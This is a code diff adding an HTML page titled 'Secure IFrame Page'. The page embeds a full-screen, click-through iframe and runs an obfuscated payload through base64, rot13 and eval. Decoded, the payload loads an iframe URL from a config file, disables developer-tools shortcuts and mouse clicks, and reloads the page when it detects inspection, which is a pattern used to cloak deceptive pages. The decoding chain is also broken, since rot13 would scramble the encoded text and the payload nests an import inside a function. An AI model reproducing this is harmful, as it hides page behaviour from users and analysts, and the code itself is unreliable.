@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Secure IFrame Page</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+      background: black;
+    }
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+  <iframe id="secureFrame" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
+
+  <script>
+    function rot13(str) {
+      return str.replace(/[a-zA-Z]/g, function (c) {
+        return String.fromCharCode(
+          c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13)
+        );
+      });
+    }
+
+    const encrypted = "ZnVuY3Rpb24lMjBpbnRlcm5hbE1haW4oKSUyMCU3QiUwQWltcG9ydCUyMCUyNmlmcmFtZVVybCUyMCUyRiUyMGZyb20lMjAnLiUyRmNvbmZpZy5qcyc7JTBBY29uc3QlMjBmcmFtZSUyMCUzRCUyMGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzZWN1cmVGcmFtZScpJTNCJTBBZnJhbWUuc3JjJTIwJTNEJTIwaWZyYW1lVXJsJTNCJTBBZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignS2V5ZG93biUyMGRvd24nJTJDJTIwZnVuY3Rpb24lMjhldmVudCUyOSUyMCU3QiUwQWlmJTIwKGV2ZW50LmtleSUyMCUzRCUzRCUyMCdGMTInJTIwJTI2JTI2JTIwJTI4ZXZlbnQuY3RybEtleSUyMCUyNiUyNiUyMGV2ZW50LnNoaWZ0S2V5JTIwJTNEJTNEJTIwJ0knKSUyMCUyNiUyNiUyMChldmVudC5jdHJsS2V5JTIwJTI2JTI2JTIwZXZlbnQua2V5JTIwJTNEJTNEJTIwJ3UnKSUyOSUyMCU3QiUwQWV2ZW50LnByZXZlbnREZWZhdWx0KCklM0IlMEElN0QlMjklM0IlMEFkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdtb3VzZWRvd24nJTJDJTIwZnVuY3Rpb24lMjhldmVudCUyOSUyMCU3QiUwQWV2ZW50LnByZXZlbnREZWZhdWx0KCklM0IlMEElN0QlMjklM0IlMEFzZXRJbnRlcnZhbChmdW5jdGlvbigpJTIwJTdCJTBBaWYlMjAod2luZG93Lm91dGVySGVpZ2h0JTIwLSUyMHdpbmRvdy5pbm5lckhlaWdodCUyMCUzRCUzRCUyMDIwMCUyMCUyNiUyNiUyMHdpbmRvdy5vdXRlcldpZHRoJTIwLSUyMHdpbmRvdy5pbm5lcldpZHRoJTIwJTNEJTNEJTIwMjAwKSUyMCU3QiUwQWxvY2F0aW9uLnJlbG9hZCgpJTNCJTBBJTdEJTJDJTIwNTAwJTI5JTNCJTBB";
+
+    const decoded = unescape(rot13(atob(encrypted)));
+    eval(decoded);
+  </script>
+</body>
+</html>
